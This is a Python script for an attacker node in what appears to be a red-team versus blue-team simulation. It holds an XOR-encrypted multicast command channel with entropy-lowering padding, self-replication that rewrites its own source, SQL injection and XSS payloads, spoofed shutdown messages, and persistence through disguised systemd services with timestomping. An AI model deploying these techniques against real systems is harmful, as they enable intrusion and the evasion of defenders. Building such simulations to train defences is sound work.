#!/usr/bin/env python3
import socket
import struct
import time
import json
import threading
import sys
import os
import random
import uuid
import secrets

# Add root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import config
import utils
import urllib.parse
import base64
import shutil
import zlib
from vnet.nic import VNic
from vnet.protocol import MSG_DATA
from payloads.obfuscation import deep_encode
from payloads.polymorph import polymorph_payload

# Configuration
MCAST_GRP = '224.1.1.1'
MCAST_PORT = 5007
NODE_ID = str(uuid.uuid4())[:8]

logger = utils.setup_logging(f"RedNode-{NODE_ID}", config.RED_LOG)

class RedMeshNode:
    def __init__(self, gene_jitter=5.0, gene_aggression=0.5, gene_stealth=False):
        self.peers = set()
        self.peer_genes = {} # {peer_id: genes}
        self.running = True
        self.sock = None
        self.start_time = time.time()

        # Genetics
        self.genes = {
            "jitter": gene_jitter,
            "aggression": gene_aggression,
            "stealth": gene_stealth
        }

        # RL Brain (Adversarial)
        self.brain = utils.RLBrain(f"RedNode-{NODE_ID}", ["POLYMORPH", "STEGO", "FLOOD_C2", "FUZZ_BLUE", "NET_EXPLOIT"])

        # Virtual Network
        self.nic = VNic(f"10.0.{random.randint(20,200)}.{random.randint(2,254)}")
        self.known_targets = set()
        self.block_count = 0

        # C2 Encryption Key (Shared Static for Sim)
        self.c2_key = b"DEADBEEF"

    def encrypt_c2(self, payload):
        """XOR Encryption for C2 with Entropy Reduction (Padding)."""
        data = json.dumps(payload).encode()
        encrypted = bytearray()
        for i in range(len(data)):
            encrypted.append(data[i] ^ self.c2_key[i % len(self.c2_key)])

        b64 = base64.b64encode(encrypted).decode()

        # Evasion: Append low-entropy padding if stealth gene is high
        if self.genes['stealth']:
            # Pad with repeated characters or English-like text to lower average entropy
            padding = "The quick brown fox jumps over the lazy dog. " * int(len(b64) / 10)
            return b64 + "||PADDING||" + padding
        return b64

    def get_state(self):
        # Quantize state: (PeerCount_Bucket, Success_Bool)
        peer_bucket = "LOW" if len(self.peers) < 3 else "HIGH"
        return f"{peer_bucket}"

    def choose_strategy(self):
        return self.brain.choose_action(self.get_state())

    def learn(self, action, reward):
        state = self.get_state()
        # Assume next state is same for simplicity in this loop
        self.brain.learn(state, action, reward, state)
        self.brain.save()

    def setup_multicast(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', MCAST_PORT))

        # Fix: Use 4s4s for 64-bit compatibility (Group, Interface)
        mreq = struct.pack("4s4s", socket.inet_aton(MCAST_GRP), socket.inet_aton("0.0.0.0"))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        # Sender socket
        self.sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.sender.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    def start_network_ops(self):
        """Connect to VNet and start operations."""
        if self.nic.connect():
            logger.info(f"Connected to VNet as {self.nic.ip}")
            t = threading.Thread(target=self.network_listener, daemon=True)
            t.start()
        else:
            logger.warning("VNet connection failed.")

    def network_listener(self):
        while self.running and self.nic.connected:
            msg = self.nic.recv()
            if msg:
                # Analyze responses for recon
                src = msg.get('src')
                payload = msg.get('payload', {})
                if "status" in payload:
                    logger.info(f"VNet Response from {src}: {payload}")
                    if payload.get('status') == 200:
                        self.known_targets.add(src)

    def hyper_mutate(self):
        """Adaptive Response: Change signature immediately."""
        logger.warning("🧬 HYPER-MUTATION TRIGGERED: Adapting to Blockade")

        # 1. Change Genes
        self.genes['stealth'] = min(1.0, self.genes['stealth'] + 0.2)
        self.genes['aggression'] = max(0.1, self.genes['aggression'] - 0.2)

        # 2. Change IP (Simulated Re-connect)
        self.nic.close()
        new_ip = f"10.0.{random.randint(20,200)}.{random.randint(2,254)}"
        self.nic = VNic(new_ip)
        self.nic.connect()
        logger.info(f"🔄 Re-connected with new Identity: {new_ip}")
        self.block_count = 0

    def net_exploit(self):
        """Launch attacks via VNet."""
        # Fast Flux: Rotate Identity frequently
        if self.block_count > 0 or random.random() < 0.2:
            self.hyper_mutate()

        if not self.nic.connected:
            self.nic.connect()
            return

        target = "10.10.10.10" # Static for now, or use discovered targets

        # Wolf Pack Coordination
        if len(self.peers) > 2 and random.random() < 0.1:
            logger.info("🐺 WOLF PACK: Initiating Synchronized Attack")
            self.broadcast("CMD", "SYNC_ATTACK")

        attacks = [
            # SQL Injection
            {"path": "/login", "data": {"username": "admin' OR '1'='1", "password": "x"}, "desc": "SQLi Login Bypass"},
            # XSS
            {"path": "/search_user", "data": {"q": "<script>alert(1)</script>"}, "desc": "Reflected XSS"},
            # Business Logic
            {"path": "/transfer", "data": {"amount": "-500"}, "desc": "Negative Transfer"}
        ]

        attack = random.choice(attacks)
        payload = {
            "method": "POST",
            "path": attack['path'],
            "data": attack['data']
        }

        # 1. Structural Polymorphism (Hash Busting)
        payload = polymorph_payload(payload)

        # 2. Obfuscation (Evolutionary)
        if random.random() < self.genes['stealth']:
            # URL Encode values
            for k, v in payload['data'].items():
                if isinstance(v, str) and random.random() > 0.5:
                    payload['data'][k] = urllib.parse.quote(v)
                    attack['desc'] += " (Obfuscated)"

        logger.info(f"🚀 LAUNCHING NET EXPLOIT: {attack['desc']} -> {target}")
        if not self.nic.send(target, payload):
            logger.warning("💥 Attack Blocked/Failed")
            self.block_count += 1
        else:
            self.block_count = 0 # Reset on success

    def broadcast(self, msg_type, payload):
        """Send message to mesh (Encrypted)."""
        # Convert Q-table tuple keys to strings for JSON
        serializable_brain = {str(k): v for k, v in self.brain.q_table.items()}

        inner_msg = {
            "ver": 1,
            "sender": NODE_ID,
            "type": msg_type,
            "payload": payload,
            "genes": self.genes,
            "brain": serializable_brain,
            "ts": time.time()
        }

        # Encrypt the entire inner message
        blob = self.encrypt_c2(inner_msg)

        wrapper = {
            "proto": "C2v2",
            "blob": blob
        }

        data = json.dumps(wrapper).encode('utf-8')
        try:
            self.sender.sendto(data, (MCAST_GRP, MCAST_PORT))
        except Exception as e:
            logger.error(f"Broadcast failed: {e}")

    def update_topology(self):
        """Update shared topology file for visualization."""
        topo = utils.safe_json_read(config.TOPOLOGY_FILE, {})
        topo[NODE_ID] = {
            "type": "RED",
            "peers": list(self.peers),
            "last_seen": time.time(),
            "genes": self.genes
        }
        utils.safe_json_write(config.TOPOLOGY_FILE, topo)

    def reproduce(self):
        """Evolutionary Replication."""
        # Safety: Check global node count to prevent Fork Bomb
        try:
            # We estimate count by checking process list or topology
            # Using topology is safer as it's shared state
            topo = utils.safe_json_read(config.TOPOLOGY_FILE, {})
            red_nodes = [k for k,v in topo.items() if v['type'] == 'RED' and time.time() - v.get('last_seen', 0) < 10]
            if len(red_nodes) >= config.MAX_NODES:
                logger.warning("⚠️ Overpopulation: Reproduction halted.")
                return
        except Exception: return

        # Only reproduce if we survived long enough
        age = time.time() - self.start_time
        if age > 15: # Fast evolution for sim
            logger.info("🧬 MITOSIS: Spawning Offspring Node")

            # Crossover (Sexual Reproduction if peers exist)
            base_genes = self.genes.copy()
            if self.peer_genes:
                mate_id = random.choice(list(self.peer_genes.keys()))
                mate_genes = self.peer_genes[mate_id]
                logger.info(f"💕 CROSSOVER with {mate_id}")

                # Average numeric genes
                base_genes['jitter'] = (base_genes['jitter'] + mate_genes['jitter']) / 2
                base_genes['aggression'] = (base_genes['aggression'] + mate_genes['aggression']) / 2
                # 50/50 Chance for boolean genes
                if random.random() > 0.5:
                    base_genes['stealth'] = mate_genes['stealth']

            # Mutation
            new_jitter = max(1.0, base_genes['jitter'] + random.uniform(-1.0, 1.0))
            new_aggro = max(0.1, min(1.0, base_genes['aggression'] + random.uniform(-0.1, 0.1)))
            new_stealth = not base_genes['stealth'] if random.random() > 0.9 else base_genes['stealth']

            # Spawn process
            import subprocess

            # Polymorphic Code Generation (Runtime)
            try:
                with open(__file__, 'r') as f:
                    source_code = f.read()

                # Mutate source (simple variable rename or comment injection)
                mutation_id = secrets.token_hex(4)
                mutated_source = f"# MUTATION {mutation_id}\n" + source_code.replace("RedMeshNode", f"RedMeshNode_{mutation_id}")

                new_file = os.path.join(config.SIMULATION_DATA_DIR, f"red_node_{mutation_id}.py")
                with open(new_file, 'w') as f:
                    f.write(mutated_source)

                cmd = [sys.executable, new_file,
                       str(new_jitter), str(new_aggro), str(new_stealth)]

                subprocess.Popen(cmd)
                self.start_time = time.time() # Reset breeding timer
            except Exception as e:
                logger.error(f"Polymorphic Reproduction failed: {e}")
                # Fallback to standard
                cmd = [sys.executable, __file__,
                       str(new_jitter), str(new_aggro), str(new_stealth)]
                subprocess.Popen(cmd)

    def decrypt_c2(self, blob):
        try:
            # Strip padding
            if "||PADDING||" in blob:
                blob = blob.split("||PADDING||")[0]

            encrypted = base64.b64decode(blob)
            decrypted = bytearray()
            for i in range(len(encrypted)):
                decrypted.append(encrypted[i] ^ self.c2_key[i % len(self.c2_key)])
            return json.loads(decrypted.decode())
        except: return None

    def listener(self):
        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
                wrapper = json.loads(data.decode('utf-8'))

                if wrapper.get("proto") == "C2v2":
                    msg = self.decrypt_c2(wrapper["blob"])
                    if not msg: continue
                else:
                    msg = wrapper # Fallback legacy

                sender = msg.get('sender')
                if sender == NODE_ID: continue # Ignore self

                # Gene Harvesting
                if 'genes' in msg:
                    self.peer_genes[sender] = msg['genes']

                # Federated Learning
                if 'brain' in msg:
                    self.brain.merge(msg['brain'])

                if sender not in self.peers:
                    self.peers.add(sender)
                    logger.info(f"New Peer Discovered: {sender}")
                    self.update_topology()

                msg_type = msg.get('type')
                if msg_type == "CMD":
                    cmd = msg.get('payload')
                    logger.info(f"Executing Mesh Command: {cmd}")

                    # Wolf Pack Tactics
                    if cmd == "SYNC_ATTACK":
                        # Delay slightly to synchronize with peers
                        delay = random.uniform(0.1, 0.5)
                        time.sleep(delay)
                        self.net_exploit()

            except Exception as e:
                logger.error(f"Receive error: {e}")

    def launch_assault(self):
        """Active Assault: Fuzzing & Exploitation (T1498)."""
        if random.random() < self.genes['aggression']:
            target = ('224.2.2.2', 5008) # Blue Swarm
            payloads = [
                b"{ 'broken': json }",
                b"A" * 1024, # Buffer overflow attempt
                json.dumps({"type": "IOC_Found", "ioc": None}).encode(), # Logic error
                json.dumps({"sender": "ADMIN", "type": "SHUTDOWN"}).encode() # Spoofing
            ]
            payload = random.choice(payloads)

            try:
                self.sock.sendto(payload, target)
                logger.info(f"⚔️ ASSAULT: Fuzzing Blue Swarm ({len(payload)} bytes)")
            except Exception as e:
                logger.error(f"Assault failed: {e}")

    def drop_stego(self):
        """Drop covert channel payload."""
        if random.random() < self.genes['stealth']: # Stealth based
            fname = os.path.join(config.SIMULATION_DATA_DIR, f"vacation_{random.randint(1,100)}.jpg")
            payload = {"cmd": "EXECUTE_ORDER_66", "target": "BLUE"}
            utils.steganography_encode(payload, fname)
            logger.info(f"Dropped Stego Payload: {fname}")

    def timestomp(self, path):
        """Match timestamps of a system file (Obfuscation)."""
        try:
            # Pick a reference file (e.g., config.py)
            ref_path = config.BASE_DIR
            st = os.stat(ref_path)
            os.utime(path, (st.st_atime, st.st_mtime))
        except: pass

    def establish_persistence(self):
        """Simulate dropping persistence artifacts (Polyglot + Masquerading)."""
        # Lazarus Mechanism
        if hasattr(self, 'persistence_file') and self.persistence_file:
            if not os.path.exists(self.persistence_file):
                logger.info(f"🧟 LAZARUS: Persistence file {os.path.basename(self.persistence_file)} was deleted! Re-creating...")
                self._write_persistence(self.persistence_file)
            return

        # New Persistence with Polyglot payload
        if random.random() < 0.3:
            # 1. Drop the "Image" (Encrypted Payload)
            img_names = ["wallpaper.png", "icon_cache.png", "banner.jpg"]
            img_name = random.choice(img_names)
            img_path = os.path.join(config.SIMULATION_DATA_DIR, img_name)

            payload_data = {"cmd": "SPAWN_AGENT", "parent": NODE_ID}
            obfuscated = deep_encode(payload_data, "PNG")

            try:
                with open(img_path, 'wb') as f: f.write(obfuscated)
                self.timestomp(img_path)
            except: pass

            # 2. Drop the Loader (looks like a helper script)
            loader_name = f"display_helper_{secrets.token_hex(2)}.py"
            loader_path = os.path.join(config.SIMULATION_DATA_DIR, loader_name)
            self._write_loader(loader_path, img_path)
            self.timestomp(loader_path)

            # 3. Create Service pointing to Loader
            legit_names = ["dbus-daemon-helper", "systemd-journal-upload", "network-dispatcher"]
            svc_name = f"{random.choice(legit_names)}.service"
            target = os.path.join(config.PERSISTENCE_DIR, svc_name)

            self._write_service(target, loader_path)
            self.persistence_file = target
            self.timestomp(target)

    def _write_loader(self, path, payload_path):
        """Create a loader script that decrypts the 'image' and 'runs' it."""
        # In sim, we just read it to trigger EDR inspection
        content = f"""#!/usr/bin/env python3
import sys
import os
import time
# Benign imports to look legit
import argparse
import logging

def main():
    # Load configuration from 'image'
    payload_file = "{payload_path}"
    if os.path.exists(payload_file):
        with open(payload_file, 'rb') as f:
            data = f.read()
        # In real malware, this would decode and exec
        # Here we just sleep to be a process
        time.sleep(60)

if __name__ == "__main__":
    main()
"""
        with open(path, 'w') as f: f.write(content)

    def _write_service(self, target, loader_path):
        content = f"""[Unit]
Description=System Display Helper
Documentation=man:systemd(1)

[Service]
Type=simple
ExecStart={sys.executable} {loader_path}
Restart=always
"""
        try:
            with open(target, 'w') as f: f.write(content)
            logger.info(f"Persistence established: {os.path.basename(target)}")
        except Exception as e:
            logger.error(f"Failed to write persistence: {e}")

    def run(self):
        logger.info(f"Red Mesh Node {NODE_ID} coming online...")
        utils.enforce_seccomp() # Hardening
        self.setup_multicast()
        self.start_network_ops()

        t = threading.Thread(target=self.listener)
        t.daemon = True
        t.start()

        # Heartbeat / Beacon
        while self.running:
            self.broadcast("HEARTBEAT", "Still Alive")
            self.reproduce()

            # RL Decision Loop
            action = self.choose_strategy()
            reward = 0

            if action == "POLYMORPH":
                # Implicit in reproduce, but force it
                pass
            elif action == "STEGO":
                self.drop_stego()
                reward = 5 # Small reward for attempt
            elif action == "FLOOD_C2":
                self.broadcast("CMD", "FLOOD_TEST")
                reward = 2
            elif action == "FUZZ_BLUE":
                self.launch_assault()
                reward = 10 # High reward for aggression
            elif action == "NET_EXPLOIT":
                self.net_exploit()
                reward = 15

            # Check survival (Simplistic reward)
            reward += 1
            self.learn(action, reward)

            self.establish_persistence()

            # Behavior based on Genes
            sleep_time = self.genes['jitter']
            if self.genes['stealth']:
                sleep_time *= 2

            time.sleep(max(1, sleep_time + random.uniform(-1, 1)))

if __name__ == "__main__":
    # Parse Genes from CLI (if spawned)
    g_jitter = 5.0
    g_aggro = 0.5
    g_stealth = False

    if len(sys.argv) >= 4:
        g_jitter = float(sys.argv[1])
        g_aggro = float(sys.argv[2])
        g_stealth = sys.argv[3] == 'True'

    node = RedMeshNode(g_jitter, g_aggro, g_stealth)
    try:
        node.run()
    except KeyboardInterrupt:
        pass
